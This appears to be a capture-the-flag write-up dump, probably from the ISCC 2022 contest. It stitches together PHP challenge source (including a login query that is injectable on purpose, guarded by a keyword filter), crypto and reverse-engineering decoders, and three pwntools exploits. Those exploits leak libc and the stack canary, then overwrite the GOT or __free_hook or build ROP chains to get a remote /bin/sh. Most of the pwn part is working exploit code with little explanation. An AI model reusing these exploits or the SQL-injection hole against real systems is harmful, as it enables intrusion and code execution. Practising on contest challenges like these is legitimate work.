<?php

show_source(__FILE__);

$Step1=False;
$Step2=False;
$Information = '{"year":"2022a","items":"skiing"}';
$test = array("s","k","i");
echo $test;
$info=(array)json_decode('{"year":"2022a","items":["ski",["i"],0]}');
echo $info;
if(is_array($info)){

    var_dump($info);
    echo "dump!";
    is_numeric(@$info["year"])?die("Sorry~!!!"):NULL;
    echo "is_numeric done!\n";

    if(@$info["year"]){
        ($info["year"]=2022)?$Step1=True:NULL;
    }
    if($Step1)echo "Step1OK";
    else echo "Fail";

    var_dump((is_array(@$info["items"])));

    echo var_dump($info["items"][1]);

    if(is_array(@$info["items"])){
        echo "isarry!\n";
        var_dump(!is_array($info["items"][1]));
        var_dump(count($info["items"])!==3);
        var_dump(!is_array($info["items"][1]) OR count($info["items"])!==3);

        if(!is_array($info["items"][1]) OR count($info["items"])!==3 ) die("Sorry~~~~");

        echo "Done!";

        $status = array_search("skiing", $info["items"]);

        $status===false?die("Sorry~++++"):NULL;

        foreach($info["items"] as $key=>$val){
            $val==="skiing"?die("Sorry~"):NULL;
        }
        $Step2=True;
    }
}

if($Step1 && $Step2){
    echo "OK";
}
?>

<?php
include "./config.php";
// error_reporting(0);
// highlight_file(__FILE__);
$conn = mysqli_connect($hostname, $username, $password, $database);
   if ($conn->connect_errno) {
    die("Connection failed: " . $conn->connect_errno);
} 

echo "Where is the database?"."<br>";

echo "try ?id";

function sqlWaf($s)
{
    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|"|\^|\||\ |\'/i';
    if (preg_match($filter,$s))
        return False;
    return True;
}

if (isset($_GET['id'])) 
{
    $id = $_GET['id'];
    $sql = "select * from users where id=$id";
    $safe = preg_match('/select/is', $id);
    if($safe!==0)
        die("No select!");
    $result = mysqli_query($conn, $sql);
    if ($result) 
    {
        $row = mysqli_fetch_array($result);
        echo "<h3>" . $row['username'] . "</h3><br>";
        echo "<h3>" . $row['passwd'] . "</h3>";
    }
    else
        die('<br>Error!');
}


if (isset($_POST['username']) && isset($_POST['passwd'])) 
{

    $username = strval($_POST['username']);
    $passwd = strval($_POST['passwd']);

    if ( !sqlWaf($passwd) )
        die('damn hacker');

    $sql = "SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if ( $row['username'] === 'admin' && $row['passwd'] )
        {

            } else {
                die("username or passwd wrong, are you admin?");
            }
        } else {
            die("wrong user");
        }
    } else {
        die("user not exist or wrong passwd");
    }
}
mysqli_close($conn); 
?>

exp:

from libnum import *
ciphertext = eval(open('enc.txt','r').read())
priv = eval(open('priv.Key','r').read())
pub = eval(open('pub.Key','r').read())
q = eval(open('q.txt','r').read())
r = eval(open('r.txt','r').read())

rinv = invmod(r,q)

cc = ciphertext * rinv % q
msgbit = ''
for coeff in priv[::-1]:
    if cc // coeff == 0:
        msgbit += '0'
    else:
        msgbit += '1'
    cc %= coeff

print(n2s(int(msgbit[::-1],2)))

#include<bits/stdc++.h>
using namespace std;
int main(int argc,char *argv[]) 
{
 string flag = "ISCC{012345678901}";
 int key[4] = {'I', 'S', 'C', 'C'};
 int n = 18;
 int rounds = 52 / n + 6; 
 int static1 = 0; 
 long long flagI[18] = {-2107429600,-2127402263,-812658708,2013727646,-2124073059,-344045391,61124428,-483779417,734300904,539540243,82870802,-526018275,-170745234,1669825930,452740702,-108762530,-97994846,-1210532932};

 rounds = 52 / n + 6; 
 static1 = rounds * -0x61C88647;
 int y = flagI[0];
 for (; rounds--;) {
 int static2 = (static1 >> 2) & 3; 
 for (int i=n-1; i>=0; i--) {
 int z = flagI[(i + n - 1)%n];
 flagI[i] -= ((y ^ static1) + (z ^ key[static2 ^ (i & 3)])) ^ (((4 * y) ^ (z >> 5)) + ((y >> 3) ^ (16 * z)));
 y = flagI[i];
 }
 static1 += 0x61C88647; 
 }
 for (int i = 0; i < n; ++i)
 cout << (char)flagI[i];
 cout << endl;
 return 0;
}

import base64

string_ = '.W1BqthGbebhYXio1XFhEY.NhVojRqXYtsVLDucXp5oFXNtieaVNfMuYhkoF0.'
b = ''
for i in string_:
    if 'a' <= i <= 'z':
        b += chr(((ord(i) - 97 - 2) % 26) + 97)
    elif 'A' <= i <= 'Z':
        b += chr(((ord(i) - 65 - 2) % 26) + 65)
    else:
        b += i

b += '\=\=\='
biao1 = "ABCDEfghijklmnopqrsTUVWXYZabcdeFGHIJKLMNOPQRStuvwxyz0123456789-_"
biao2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
flag_basex = base64.b64decode(b.translate(string_.maketrans(biao1, biao2)))
flag = base64.b64decode(flag_basex)
print(flag)

PWN

sim_treasure

from pwn import *
context.log_level='debug'
#io=process("./sp1")
io=remote("123.57.69.203:7010",7010)
elf = ELF("./sp1")
libc = ELF("./libc-2.27.so")
puts_got = elf.got['puts']
io.recvuntil("Can you find the magic word?\n")
pay_1 = p32(elf.got["puts"])+"%6$s"
io.sendline(pay_1)
io.recv(4)
puts_addr = u32(io.recv(4))
print "puts_got="+hex(puts_addr)
printf_got = elf.got['printf']
print "printf_got="+hex(printf_got)
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
print "system_addr="+hex(system_addr)
io.sendline("A")
payload1 = fmtstr_payload(6,{printf_got: system_addr})
io.recvuntil("A\n")
io.sendline(payload1)
io.sendline("/bin/sh")
io.interactive();

from pwn import *
context.log_level='debug'
p=remote('123.57.69.203',7020)
elf=ELF('./attachment-10')
p.recvuntil('~')
for i in range(232-15):
    p.sendline(b'255')
for i in range(7):
    p.sendline(b'+')
for i in range(6):
    p.sendline('+')
for i in range(2):
    p.sendline(b'255')
p.recvuntil('\xff'*(232-15))
canary=u64(b'\0'+p.recv(7))
success('canary:'+hex(canary))
stack_addr=u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')
success('stack:'+hex(stack_addr))
p.recvuntil('\xff\xff')
code_base=u64(p.recv(6)+b'\0\0')-24-elf.sym['main']
success('code_base:'+hex(code_base))
leave=0x124a+code_base
pop_rdi=0x130b+code_base

payload=(p64(pop_rdi)+p64(code_base+elf.got['puts'])+p64(code_base+elf.sym['puts'])+p64(pop_rdi+1)+p64(code_base+elf.sym['main'])).ljust(0xd8,b'a')+p64(canary)+p64(stack_addr-0xf8)+p64(leave)

p.send(payload)
libc_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\0'))-0x0809c0
success('libc_addr:'+hex(libc_addr))
p.recvuntil('~')
for i in range(232-15):
    p.sendline(b'255')
for i in range(7):
    p.sendline(b'+')
for i in range(8):
    p.sendline('+')
p.recvuntil('\xff'*(232-15))
canary=u64(b'\0'+p.recv(7))
success('canary:'+hex(canary))
payload=(p64(pop_rdi)+p64(libc_addr+0x1b3e9a)+p64(0x04f440+libc_addr)).ljust(0xd8,b'a')+p64(canary)+p64(stack_addr-0xf8-0xd0)+p64(leave)
#gdb.attach(p)
p.send(payload)
p.interactive()

untidy_note

from pwn import *
r = remote("123.57.69.203",7030)
context.log_level = 'debug'
libc = ELF('libc-2.27.so')

def add(how):
    r.recvuntil("is:\n")
    r.sendline("1")
    r.recvuntil("is:\n")
    r.sendline(str(how))

def edit(which, how, what):
    r.recvuntil("is:\n")
    r.sendline("3")
    r.recvuntil(":\n")
    r.sendline(str(which))
    r.recvuntil("is:\n")
    r.sendline(str(how))
    r.recvuntil(":\n")
    r.sendline(what)

def show(which):
    r.recvuntil("is:\n")
    r.sendline("4")
    r.recvuntil(":\n")
    r.sendline(str(which))

def dele(which):
    r.recvuntil("is:\n")
    r.sendline("2")
    r.recvline()
    r.sendline(str(which))

r.recv()
r.sendline('1')
for i in range(10):
    add(30)
for i in range(8):
    dele(i)
r.recv()
r.sendline('1' * 0x400)
show(7)
r.recvuntil("Content:")
base = u64(r.recv(6) + '\x00' * 2) - 0x3ebcc0
print(hex(base))
raw_input()
free_hook = base + libc.sym['__free_hook']
sys = base + libc.sym['system']
edit(1, 30, p64(free_hook) * 2)
for i in range(7):
    add(30)
edit(4, 30, "/bin/sh\x00")
edit(8, 30, p64(sys))
dele(4)
r.interactive()
